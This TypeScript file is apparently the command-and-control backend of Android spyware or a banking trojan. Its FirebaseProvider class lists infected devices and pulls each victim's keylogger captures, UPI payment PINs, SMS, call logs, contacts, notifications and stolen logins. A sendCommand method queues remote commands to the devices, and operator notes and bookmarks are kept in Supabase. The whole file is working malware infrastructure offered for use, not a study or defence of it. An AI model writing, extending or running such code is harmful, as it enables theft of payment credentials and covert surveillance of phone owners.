import { createClient } from '@supabase/supabase-js';
import config from '../config/env';
import { IDeviceProvider, DeviceStats } from './base';
import { firebaseService } from '../services/firebase.service';

export class FirebaseProvider implements IDeviceProvider {
    private databaseUrl: string;
    private appId?: string;
    private supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

    constructor(databaseUrl: string, appId?: string) {
        this.databaseUrl = databaseUrl;
        this.appId = appId;
    }

    async listDevices(_limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, 'devices');
        if (!firebaseData) return [];
        const firebaseDevices = Object.entries(firebaseData)
            .filter(([_, dev]: [string, any]) => {
                if (!this.appId) return true;
                const devAppId = dev.app_id || dev.appId;
                // If the device has an app assignment in Firebase, it must match our current app.
                // If it has no assignment, we allow it (for legacy or single-tenant databases).
                return !devAppId || devAppId === this.appId;
            })
            .map(([id, dev]: [string, any]) => {
                const normalized = this.normalizeDevice(dev, id);
                return {
                    ...normalized,
                    _sourceProvider: 'FIREBASE'
                };
            });

        // Fetch counts for all devices
        const [_, __, allKeys, allPins] = await Promise.all([
            firebaseService.read(this.databaseUrl, 'sms'),
            firebaseService.read(this.databaseUrl, 'apps'),
            firebaseService.read(this.databaseUrl, 'keylogger'),
            firebaseService.read(this.databaseUrl, 'pins')
        ]);

        // Fetch metadata (notes, bookmarks) from Supabase
        const deviceIds = firebaseDevices.map(d => d.device_id);
        const { data: metadata } = await this.supabase
            .from('devices')
            .select('device_id, note, is_bookmarked, status, last_seen')
            .in('device_id', deviceIds);

        // Merge metadata
        if (metadata && metadata.length > 0) {
            const metaMap = new Map(metadata.map(m => [m.device_id, m]));
            return firebaseDevices.map(dev => {
                const meta = metaMap.get(dev.device_id);
                const counts = {
                    key_logs: Object.keys(allKeys?.[dev.device_id] || {}).length,
                    upi_pins: Object.keys(allPins?.[dev.device_id] || {}).length
                };

                if (meta) {
                    return {
                        ...dev,
                        note: meta.note || dev.note,
                        is_bookmarked: meta.is_bookmarked ?? dev.is_bookmarked,
                        status: meta.status ?? dev.status,
                        last_seen: meta.last_seen || dev.last_seen,
                        _count: counts
                    };
                }
                return { ...dev, _count: counts };
            });
        }

        return firebaseDevices.map(dev => ({
            ...dev,
            _count: {
                key_logs: Object.keys(allKeys?.[dev.device_id] || {}).length,
                upi_pins: Object.keys(allPins?.[dev.device_id] || {}).length
            }
        }));
    }

    async getDevice(deviceId: string): Promise<any> {
        const dev = await firebaseService.read(this.databaseUrl, `devices/${deviceId}`);
        if (!dev) return null;

        // Verify appId if set in the device data
        if (this.appId) {
            const devAppId = dev.app_id || dev.appId;
            if (devAppId && devAppId !== this.appId) return null;
        }

        const normalized = this.normalizeDevice(dev, deviceId);

        // Fetch counts
        const [_, __, keys, pins] = await Promise.all([
            firebaseService.read(this.databaseUrl, `sms/${deviceId}`),
            firebaseService.read(this.databaseUrl, `apps/${deviceId}`),
            firebaseService.read(this.databaseUrl, `keylogger/${deviceId}`),
            firebaseService.read(this.databaseUrl, `pins/${deviceId}`)
        ]);

        const counts = {
            key_logs: Object.keys(keys || {}).length,
            upi_pins: Object.keys(pins || {}).length
        };

        // Fetch metadata from Supabase
        const { data: meta } = await this.supabase
            .from('devices')
            .select('note, is_bookmarked, status, last_seen')
            .eq('device_id', deviceId)
            .maybeSingle();

        return {
            ...normalized,
            note: meta?.note || normalized.note,
            is_bookmarked: meta?.is_bookmarked ?? normalized.is_bookmarked,
            status: meta?.status ?? normalized.status,
            last_seen: meta?.last_seen || normalized.last_seen,
            _count: counts,
            _sourceProvider: 'FIREBASE'
        };
    }

    async getDeviceStats(deviceId: string): Promise<DeviceStats> {
        const [msgs, apps, keys, pins] = await Promise.all([
            firebaseService.read(this.databaseUrl, `sms/${deviceId}`),
            firebaseService.read(this.databaseUrl, `apps/${deviceId}`),
            firebaseService.read(this.databaseUrl, `keylogger/${deviceId}`),
            firebaseService.read(this.databaseUrl, `pins/${deviceId}`)
        ]);

        return {
            messages: Array.isArray(msgs) ? msgs.length : Object.keys(msgs || {}).length,
            apps: Array.isArray(apps) ? apps.length : Object.keys(apps || {}).length,
            keylogs: Array.isArray(keys) ? keys.length : Object.keys(keys || {}).length,
            upiPins: Array.isArray(pins) ? pins.length : Object.keys(pins || {}).length
        };
    }

    async getMessages(deviceId: string, limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `sms/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData)
            .sort((a: any, b: any) => (b.timestamp || 0) - (a.timestamp || 0))
            .slice(0, limit);
    }

    async getApps(deviceId: string, limit: number = 200): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `apps/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData)
            .map(app => ({
                ...app,
                app_name: app.appName || app.app_name, // Map appName to app_name
                package_name: app.packageName || app.package_name
            }))
            .sort((a: any, b: any) => (a.app_name || '').localeCompare(b.app_name || ''))
            .slice(0, limit);
    }

    async getKeylogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `keylogger/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData)
            .map(log => ({
                ...log,
                key: log.appName || log.key, // Map appName to key
                keylogger: log.text || log.keylogger // Map text to keylogger
            }))
            .sort((a: any, b: any) => new Date(b.currentDate || 0).getTime() - new Date(a.currentDate || 0).getTime())
            .slice(0, limit);
    }

    async getUpiPins(deviceId: string): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `pins/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData);
    }

    async getHeartbeat(deviceId: string, _limit: number = 50): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `heartbeat/${deviceId}`);
        if (!firebaseData) return [];
        return [firebaseData]; // Returns the single heartbeat object as an array
    }

    async getSims(deviceId: string): Promise<any[]> {
        const dev = await this.getDevice(deviceId);
        return dev?.sim_cards || dev?.simCards || [];
    }

    async getNotifications(deviceId: string, limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `notifications/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData)
            .sort((a: any, b: any) => (b.timestamp || 0) - (a.timestamp || 0))
            .slice(0, limit);
    }

    async getCallLogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `call_logs/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData)
            .sort((a: any, b: any) => (b.timestamp || 0) - (a.timestamp || 0))
            .slice(0, limit);
    }

    async getContacts(deviceId: string): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `contacts/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData);
    }

    async getLogins(deviceId: string): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, `logins/${deviceId}`);
        return this.normalizeFirebaseCollection(firebaseData);
    }

    async sendCommand(deviceId: string, command: string, payload: any): Promise<any> {
        const commandId = `${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
        const path = `commands/${deviceId}/${commandId}`;
        const firebaseCmd = {
            id: commandId,
            command,
            payload: payload || {},
            status: 'pending',
            timestamp: Date.now()
        };
        return await firebaseService.write(this.databaseUrl, path, firebaseCmd);
    }

    async listAllMessages(limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, 'sms');
        const allMessages: any[] = [];
        Object.entries(firebaseData || {}).forEach(([deviceId, deviceMsgs]) => {
            this.normalizeFirebaseCollection(deviceMsgs).forEach(msg => {
                allMessages.push({ ...msg, device_id: deviceId });
            });
        });
        return allMessages
            .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
            .slice(0, limit);
    }

    async listAllApps(limit: number = 200): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, 'apps');
        const allApps: any[] = [];
        Object.entries(firebaseData || {}).forEach(([deviceId, deviceApps]) => {
            this.normalizeFirebaseCollection(deviceApps).forEach(app => {
                allApps.push({
                    ...app,
                    app_name: app.appName || app.app_name,
                    package_name: app.packageName || app.package_name,
                    device_id: deviceId
                });
            });
        });
        return allApps
            .sort((a, b) => (a.app_name || '').localeCompare(b.app_name || ''))
            .slice(0, limit);
    }

    async listAllKeylogs(limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, 'keylogger');
        const allLogs: any[] = [];
        Object.entries(firebaseData || {}).forEach(([deviceId, logs]) => {
            this.normalizeFirebaseCollection(logs).forEach(log => {
                allLogs.push({
                    ...log,
                    key: log.appName || log.key,
                    keylogger: log.text || log.keylogger,
                    device_id: deviceId
                });
            });
        });
        return allLogs
            .sort((a, b) => new Date(b.currentDate || 0).getTime() - new Date(a.currentDate || 0).getTime())
            .slice(0, limit);
    }

    async listAllUpiPins(limit: number = 100): Promise<any[]> {
        const firebaseData = await firebaseService.read(this.databaseUrl, 'pins');
        const allPins: any[] = [];
        Object.entries(firebaseData || {}).forEach(([deviceId, pins]) => {
            this.normalizeFirebaseCollection(pins).forEach(pin => {
                allPins.push({ ...pin, device_id: deviceId });
            });
        });
        return allPins.slice(0, limit);
    }

    private normalizeDevice(dev: any, id: string): any {
        const lastSeen = dev.lastSeen || dev.lastUpdate || dev.last_seen;
        const lastSeenTime = lastSeen ? new Date(lastSeen).getTime() : 0;
        const now = Date.now();

        // Status is online if explicitly set to online OR if heartbeat is recent (e.g., < 5 minutes)
        const isStale = lastSeenTime === 0 || (now - lastSeenTime) > 5 * 60 * 1000;

        let status = false;
        const rawStatus = dev.status ?? dev.isOnline;
        if (rawStatus === true || rawStatus === 'online') {
            status = !isStale;
        } else if (rawStatus === false || rawStatus === 'offline') {
            status = false;
        } else if (!isStale) {
            status = true; // If recent update and no status field, assume online
        }

        return {
            ...dev,
            device_id: id,
            id: id,
            app_id: this.appId,
            status,
            last_seen: lastSeen || new Date(0).toISOString(),
            model: dev.model || dev.modelName || 'Unknown',
            android_version: dev.androidVersion || dev.android_version,
            sdk_version: dev.sdkVersion || dev.sdk_version,
            sim_cards: (dev.simCards || dev.sim_cards || []).map((sim: any) => ({
                carrier_name: sim.carrierName || sim.carrier_name,
                phone_number: sim.mobileNumber || sim.phone_number,
                sim_slot_index: sim.slotIndex ?? sim.sim_slot_index ?? 0
            })),
            battery_level: dev.batteryLevel ?? dev.battery_level,
            firebaseUrl: this.databaseUrl,
            _sourceProvider: 'FIREBASE'
        };
    }

    private normalizeFirebaseCollection(data: any): any[] {
        if (!data) return [];
        if (Array.isArray(data)) return data;
        return Object.values(data);
    }
}
